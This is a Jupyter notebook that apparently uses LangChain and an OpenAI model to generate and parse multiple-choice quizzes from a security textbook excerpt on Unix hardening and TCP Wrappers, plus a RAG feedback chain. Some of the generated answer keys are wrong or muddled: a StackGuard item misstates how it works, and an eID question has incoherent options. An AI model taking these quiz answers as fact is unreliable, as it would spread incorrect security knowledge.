login capability disabled, and \\r\\nany associated password or authentication credential removed.\\r\\nGuides to hardening Unix and Linux systems also often recommend changing \\r\\nthe access permissions for critical directories and files, in order to further limit access \\r\\nto them. Programs that set user (setuid) to root or set group (setgid) to a privileged \\r\\ngroup are key target for attackers. As we discuss in detail in Sections 4.4 and 25.3, \\r\\nsuch programs execute with superuser rights, or with access to resources belonging to \\r\\nthe privileged group, no matter which user executes them. A software vulnerability \\r\\nin such a program can potentially be exploited by an attacker to gain these elevated \\r\\nprivileges. This is known as a local exploit. A software vulnerability in a network \\r\\nserver could be triggered by a remote attacker. This is known as a remote exploit.\\r\\nIt is widely accepted that the number and size of setuid root programs in par\\ufffeticular should be minimized. They cannot be eliminated, as superuser privileges are \\r\\nrequired to access some resources on the system. The programs that manage user \\r\\nlogin, and allow network services to bind to privileged ports, are examples. However, \\r\\nother programs, that were once setuid root for programmer convenience, can function \\r\\nas well if made setgid to a suitable privileged group that has the necessary access to \\r\\nsome resource. Programs to display system state, or deliver mail, have been modified \\r\\nin this way. System hardening guides may recommend further changes, and indeed \\r\\nthe removal of some such programs that are not required on a particular system.\\r\\nRemote Access Controls\\r\\nGiven that remote exploits are of concern, it is important to limit access to only \\r\\nthose services required. This function may be provided by a perimeter firewall, as \\r\\nwe discussed in Chapter 9. However, host-based firewall or network access control \\r\\nmechanisms may provide additional defences. Unix and Linux systems support sev\\ufffeeral alternatives for this.\\r\\nThe TCP Wrappers library and tcpd daemon provide one mechanism that net\\ufffework servers may use. Lightly loaded services may be “wrapped” using tcpd, which \\r\\nlistens for connection requests on their behalf. It checks that any request is permitted \\r\\nby configured policy before accepting it and invoking the server program to handle \\r\\nit. Requests that are rejected are logged. More complex and heavily loaded servers \\r\\nincorporate this functionality into their own connection management code, using the \\r\\nTCP Wrappers library, and the same policy configuration files. These files are /etc\\r\\n/hosts.allow and /etc/hosts.deny, which should be set as policy requires.\\r\\nM12_STAL0611_04_GE_C12.indd 431 10/11/17 3:02 PM')], 'output_text': 'Question 1: What is the purpose of the TCP Wrappers library and tcpd daemon on Unix and Linux systems?\\nOptions:\\nA. To manage user accounts and groups\\nB. To encrypt and secure data in transit\\nC. To provide access controls for network services\\nD. To create backups and archives of system data\\nAnswer: C. To provide access controls for network services\\n\\nQuestion 2: How does Stackguard protect against stack overflow attacks on Unix and Linux systems?\\nOptions:\\nA. By encrypting sensitive data stored in memory\\nB. By disabling the execution of code on the stack\\nC. By monitoring and analyzing system logs\\nD. By preventing unauthorized access to system resources\\nAnswer: B. By disabling the execution of code on the stack\\n\\nQuestion 3: What is the purpose of the /etc/passwd and /etc/group files on Unix and Linux systems?\\nOptions:\\nA. To store system log files\\nB. To manage network firewall settings\\nC. To configure user accounts and group membership\\nD. To control access to encrypted files and directories\\nAnswer: C. To configure user accounts and group membership'}\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(f\"Processing document ...\")\n",
    "print(f\"This doc has {llm.get_num_tokens(selected_docs[0].page_content)} tokens.\")\n",
    "print(f\"This doc has {len(selected_docs[0].page_content)} characters. {len(selected_docs[0].page_content) / llm.get_num_tokens(selected_docs[0].page_content)} characters per token.\")\n",
    "with get_openai_callback() as cb:\n",
    "    summary = summary_chain.invoke(selected_docs)\n",
    "    print(f\"Callback: \\n{cb}\")\n",
    "print(f\"Summary is: {summary}\\n\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Question 1: What is the purpose of the TCP Wrappers library and tcpd daemon on Unix and Linux systems?\n",
      "Options:\n",
      "A. To manage user accounts and groups\n",
      "B. To encrypt and secure data in transit\n",
      "C. To provide access controls for network services\n",
      "D. To create backups and archives of system data\n",
      "Answer: C. To provide access controls for network services\n",
      "\n",
      "Question 2: How does Stackguard protect against stack overflow attacks on Unix and Linux systems?\n",
      "Options:\n",
      "A. By encrypting sensitive data stored in memory\n",
      "B. By disabling the execution of code on the stack\n",
      "C. By monitoring and analyzing system logs\n",
      "D. By preventing unauthorized access to system resources\n",
      "Answer: B. By disabling the execution of code on the stack\n",
      "\n",
      "Question 3: What is the purpose of the /etc/passwd and /etc/group files on Unix and Linux systems?\n",
      "Options:\n",
      "A. To store system log files\n",
      "B. To manage network firewall settings\n",
      "C. To configure user accounts and group membership\n",
      "D. To control access to encrypted files and directories\n",
      "Answer: C. To configure user accounts and group membership\n"
     ]
    }
   ],
   "source": [
    "print(summary['output_text'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Process the Quiz output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 130,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"Question 1: What is the purpose of a user-name in a computer system?\\nOptions: \\nA) To establish authentication of identity\\nB) To prove the user's identity using something they know\\nC) To establish identity\\nD) To prevent password guessing attacks\\nAnswer: C) To establish identity\\n\\nQuestion 2: What is a potential method for a hacker to find out a user's password?\\nOptions:\\nA) Guessing using personal knowledge of the user\\nB) Fake log-in screens\\nC) Asking the user directly\\nD) Phishing\\nAnswer: A) Guessing using personal knowledge of the user\\n\\nQuestion 3: What is a user and system defense to minimize the risk of a hacker getting hold of a password?\\nOptions:\\nA) Limit log-in attempts\\nB) Revealing the password to anyone\\nC) Using the same password for all systems\\nD) Leaving the password option as blank\\nAnswer: A) Limit log-in attempts\""
      ]
     },
     "execution_count": 130,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import re\n",
    "\n",
    "summary['output_text']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 131,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['',\n",
       " \"What is the purpose of a user-name in a computer system?\\nOptions: \\nA) To establish authentication of identity\\nB) To prove the user's identity using something they know\\nC) To establish identity\\nD) To prevent password guessing attacks\\nAnswer: C) To establish identity\\n\\n\",\n",
       " \"What is a potential method for a hacker to find out a user's password?\\nOptions:\\nA) Guessing using personal knowledge of the user\\nB) Fake log-in screens\\nC) Asking the user directly\\nD) Phishing\\nAnswer: A) Guessing using personal knowledge of the user\\n\\n\",\n",
       " 'What is a user and system defense to minimize the risk of a hacker getting hold of a password?\\nOptions:\\nA) Limit log-in attempts\\nB) Revealing the password to anyone\\nC) Using the same password for all systems\\nD) Leaving the password option as blank\\nAnswer: A) Limit log-in attempts']"
      ]
     },
     "execution_count": 131,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "re.split(r'Question \\d+: ', summary['output_text'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 148,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[{'Questions': 'What is the purpose of a user-name in a computer system?',\n",
       "  'Options': [' ',\n",
       "   'A',\n",
       "   ') To establish authentication of identity',\n",
       "   'B',\n",
       "   \") To prove the user's identity using something they know\",\n",
       "   'C',\n",
       "   ') To establish identity',\n",
       "   'D',\n",
       "   ') To prevent password guessing attacks'],\n",
       "  'Answer': ' C) To establish identity\\n\\n'},\n",
       " {'Questions': \"What is a potential method for a hacker to find out a user's password?\",\n",
       "  'Options': ['',\n",
       "   'A',\n",
       "   ') Guessing using personal knowledge of the user',\n",
       "   'B',\n",
       "   ') Fake log-in screens',\n",
       "   'C',\n",
       "   ') Asking the user directly',\n",
       "   'D',\n",
       "   ') Phishing'],\n",
       "  'Answer': ' A) Guessing using personal knowledge of the user\\n\\n'},\n",
       " {'Questions': 'What is a user and system defense to minimize the risk of a hacker getting hold of a password?',\n",
       "  'Options': ['',\n",
       "   'A',\n",
       "   ') Limit log-in attempts',\n",
       "   'B',\n",
       "   ') Revealing the password to anyone',\n",
       "   'C',\n",
       "   ') Using the same password for all systems',\n",
       "   'D',\n",
       "   ') Leaving the password option as blank'],\n",
       "  'Answer': ' A) Limit log-in attempts'}]"
      ]
     },
     "execution_count": 148,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "Questions_list = [{\"Questions\": re.split(r\"\\nOptions:\", q)[0], \n",
    "              \"Options\": re.split(r\"\\n([A, B, C, D])\", re.split(r\"\\nAnswer: \", re.split(r'Options:', q)[1])[0]), \n",
    "              \"Answer\": re.split(r\"\\nAnswer:\", q)[1]} \n",
    "              for q in re.split(r'Question \\d+: ', summary['output_text']) if q != \"\"]\n",
    "Questions_list"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 149,
   "metadata": {},
   "outputs": [],
   "source": [
    "Questions_list = [{\"Questions\": q[\"Questions\"], \"Options\": [\"\".join(x).strip() for x in zip(q[\"Options\"][1::2], q[\"Options\"][2::2])], \"Answer\": q[\"Answer\"].strip()} for q in Questions_list]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 150,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[{'Questions': 'What is the purpose of a user-name in a computer system?',\n",
       "  'Options': ['A) To establish authentication of identity',\n",
       "   \"B) To prove the user's identity using something they know\",\n",
       "   'C) To establish identity',\n",
       "   'D) To prevent password guessing attacks'],\n",
       "  'Answer': 'C) To establish identity'},\n",
       " {'Questions': \"What is a potential method for a hacker to find out a user's password?\",\n",
       "  'Options': ['A) Guessing using personal knowledge of the user',\n",
       "   'B) Fake log-in screens',\n",
       "   'C) Asking the user directly',\n",
       "   'D) Phishing'],\n",
       "  'Answer': 'A) Guessing using personal knowledge of the user'},\n",
       " {'Questions': 'What is a user and system defense to minimize the risk of a hacker getting hold of a password?',\n",
       "  'Options': ['A) Limit log-in attempts',\n",
       "   'B) Revealing the password to anyone',\n",
       "   'C) Using the same password for all systems',\n",
       "   'D) Leaving the password option as blank'],\n",
       "  'Answer': 'A) Limit log-in attempts'}]"
      ]
     },
     "execution_count": 150,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "ename": "",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31mThe Kernel crashed while executing code in the the current cell or a previous cell. Please review the code in the cell(s) to identify a possible cause of the failure. Click <a href='https://aka.ms/vscodeJupyterKernelCrash'>here</a> for more info. View Jupyter <a href='command:jupyter.viewOutput'>log</a> for further details."
     ]
    }
   ],
   "source": [
    "Questions_list"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Generate Feedback for large documents with RAG chain"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Using template for feedback: \n",
      "\n",
      "Using the content provided below from a PDF delimited by triple backquotes,\n",
      "please provide feedback on the user's answer to the question below.\n",
      "\n",
      "Question: What are the functions of electronic identity (eID) cards mentioned in the text?\n",
      "Options: A. Microprocessor, memory, and I/O ports; B. Use of multifactor authentication for enhanced security; C. Biometric authentication for user verification; D. False match rate and false nonmatch rate determine the accuracy of biometric authentication\n",
      "Correct answer: B. Use of multifactor authentication for enhanced security\n",
      "User's answer: {user_answer}\n",
      "\n",
      "The feedback should be related to the key concepts, facts, or information in the text.\n",
      "\n",
      "```{context}```\n",
      "\n",
      "Feedback:\n",
      "\n",
      "Callback: \n",
      "Tokens Used: 15524\n",
      "\tPrompt Tokens: 15394\n",
      "\tCompletion Tokens: 130\n",
      "Successful Requests: 1\n",
      "Total Cost (USD): $0.015654\n"
     ]
    }
   ],
   "source": [
    "import re\n",
    "from langchain.prompts import PromptTemplate\n",
    "from langchain_core.output_parsers import StrOutputParser\n",
    "from langchain_core.runnables import RunnablePassthrough\n",
    "\n",
    "question = {\"question\": \"What are the functions of electronic identity (eID) cards mentioned in the text?\", \n",
    "            \"options\": [\"A. Microprocessor, memory, and I/O ports\",\n",
    "                        \"B. Use of multifactor authentication for enhanced security\",\n",
    "                        \"C. Biometric authentication for user verification\",\n",
    "                        \"D. False match rate and false nonmatch rate determine the accuracy of biometric authentication\"],\n",
    "            \"answer\": \"B. Use of multifactor authentication for enhanced security\"}\n",
    "user_answer = \"A. Microprocessor, memory, and I/O ports\"\n",
    "\n",
    "def format_docs(docs):\n",
    "    return \"\\n\\n\".join(doc.page_content for doc in docs)\n",
    "\n",
    "retriever = db.as_retriever()\n",
    "template = \"\"\"\n",
    "Using the content provided below from a PDF delimited by triple backquotes,\n",
    "please provide feedback on the user's answer to the question below.\n",
    "\n",
    "Question: {question}\n",
    "Options: {options}\n",
    "Correct answer: {answer}\n",
    "User's answer: {user_answer}\n",
    "\n",
    "The feedback should be related to the key concepts, facts, or information in the text.\n",
    "\n",
    "```{context}```\n",
    "\n",
    "Feedback:\n",
    "\"\"\"\n",
    "\n",
    "template = re.sub(r\"{question}\", question[\"question\"], template)\n",
    "template = re.sub(r\"{options}\", \"; \".join(question[\"options\"]), template)\n",
    "template = re.sub(r\"{answer}\", question[\"answer\"], template)\n",
    "# template = re.sub(r\"{user_answer}\", user_answer, template)\n",
    "print(f\"Using template for feedback: \\n{template}\")\n",
    "\n",
    "custom_rag_prompt = PromptTemplate.from_template(template)\n",
    "\n",
    "rag_chain = (\n",
    "    {\"context\": retriever | format_docs, \"user_answer\": RunnablePassthrough()}\n",
    "    | custom_rag_prompt\n",
    "    | llm\n",
    "    | StrOutputParser()\n",
    ")\n",
    "\n",
    "with get_openai_callback() as cb:\n",
    "    feedback = rag_chain.invoke(user_answer)\n",
    "    print(f\"Callback: \\n{cb}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'The user\\'s answer to the question \"What are the functions of electronic identity (eID) cards mentioned in the text?\" is incorrect. The correct answer is B. Use of multifactor authentication for enhanced security, but the user answered A. Microprocessor, memory, and I/O ports.\\n\\nThe content provided in the PDF does not specifically mention eID cards, so the user\\'s answer is not supported by the given information. Additionally, the correct answer focuses on the use of multifactor authentication for enhanced security, which is not addressed in the provided content. Therefore, the user\\'s answer does not align with the key concepts mentioned in the text.'"
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "feedback"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Remove \"Feedback\" in response"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'The test is not good. It is too hard. The questions are not clear. \\nThe answers are not correct.'"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import re\n",
    "\n",
    "test = \"\"\"Feedback: \n",
    "Feedback:The test is not good. It is too hard. The questions are not clear. \n",
    "Feedback:\n",
    "The answers are not correct.\"\"\"\n",
    "\n",
    "feedback = re.sub(r\"Feedback:? ?\\n?\", \"\", test)\n",
    "feedback"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
